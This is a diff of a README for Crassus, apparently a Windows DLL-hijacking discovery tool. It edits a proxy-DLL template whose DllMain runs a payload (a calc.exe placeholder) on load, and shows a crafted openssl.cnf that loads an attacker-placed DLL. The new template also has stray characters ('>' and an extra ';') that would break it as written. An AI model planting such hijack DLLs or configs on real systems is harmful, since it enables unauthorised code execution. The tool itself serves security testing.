@@ -130,42 +130,48 @@ C:\tmp> Crassus.exe boot.PML
 
 ## Proxy DLL Template
 
-Below is the template that is used when generating proxy DLLs, the generated `#pragma` statements are inserted by replacing the `%_PRAGMA_COMMENTS_%` string.
+Below is the template that is used when generating proxy DLLs., For DLLs that are found by Crassus, the proxy DLL will contain the same export names, as well as the same ordinals as specified in the `.def` file.
 
-The only thing to be aware of is that the `pragma` DLL will be using a hardcoded path of its location rather than trying to load it dynamically.
+If the real DLL cannot be found using the Process Monitor log, or if the export name is problematic, the build scripts will fall back to creating a DLL without specified exports.
+
 
 ```cpp
-#pragma once
+>#pragma once
+    
+//%_BUILD_AS%
 
-%_PRAGMA_COMMENTS_%
+#include <windows.h>;
 
-#include <windows.h>
-#include <string>
+extern "C" {
 
-VOID Payload() {
-    // Run your payload here.
-    WinExec("calc.exe", 1);
-}
+  VOID Payload() {
+      // Run your payload here.
+      WinExec("calc.exe", 1);
+  }
 
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
-{
-    switch (fdwReason)
-    {
-    case DLL_PROCESS_ATTACH:
-        Payload();
-        break;
-    case DLL_THREAD_ATTACH:
-        break;
-    case DLL_THREAD_DETACH:
-        break;
-    case DLL_PROCESS_DETACH:
-        break;
-    }
-    return TRUE;
+  BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
+  {
+      switch (fdwReason)
+      {
+      case DLL_PROCESS_ATTACH:
+          Payload();
+          break;
+      case DLL_THREAD_ATTACH:
+          break;
+      case DLL_THREAD_DETACH:
+          break;
+      case DLL_PROCESS_DETACH:
+          break;
+      }
+      return TRUE;
+  }
+
+
+  #ifdef ADD_EXPORTS
+  %_EXPORTS_%
+  #endif
 }
 ```
-
-If you wish to use your own template, just make sure the `%_PRAGMA_COMMENTS_%` is in the right place.
 
 ## openssl.cnf Template
 
@@ -174,7 +180,7 @@ For applications that unsafely use the `OPENSSLDIR` variable value, a crafted `o
 ```openssl_conf = openssl_init
 [openssl_init]
 # This will attempt to load the file c:\tmp\calc.dll as part of OpenSSL initialization
-# Be sure to pay attention to whether this needs to be a 64-bit or a 32-bit library
+# Build scripts should detect whether the calc.dll library needs to be built as 32-bit or 64-bit
 /tmp/calc = asdf
 ```
 
